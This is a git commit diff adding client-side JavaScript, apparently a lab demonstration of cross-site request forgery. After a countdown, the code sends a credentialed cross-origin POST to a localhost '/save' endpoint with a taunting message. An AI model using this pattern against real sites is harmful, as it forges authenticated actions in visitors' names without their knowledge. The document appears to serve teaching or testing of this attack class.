d2bdb51147ab6c5de4d4b8939079d2f5655afd86
lulu-is-cute <71295472+lulu-is-cute@users.noreply.github.com>
2020-10-15 15:46:46 -0400

    Main attack programming

--- public/client.js
+++ public/client.js
@@ -1,7 +1,42 @@
 $(() => {
+    //FUNCTIONS
     let sleep = ms => {
         return new Promise(res => {
             setTimeout(res, ms)
         })
     }
+
+    //VARS
+    let waitingTime = 3;
+    let statusNode = $("#status")
+    //MAIN
+    async function main(){
+        for (let i = 1; i <= waitingTime; i++){
+            statusNode.text(`Starting in ${i}`)
+            await sleep(1000)
+        }
+
+        statusNode.text("Launching attack..")
+
+        $.ajaxSetup({
+            type: "POST",
+            data: {},
+            dataType: 'json',
+            xhrFields: {
+               withCredentials: true
+            },
+            crossDomain: true
+        });
+
+        $.ajax({
+            url: "http://localhost/save",
+            data: {data: "DD is a giant load"},
+            error: () => {
+                statusNode.text("Processed attack")
+            }
+        })
+        //main attack
+    }
+
+    main()
 })
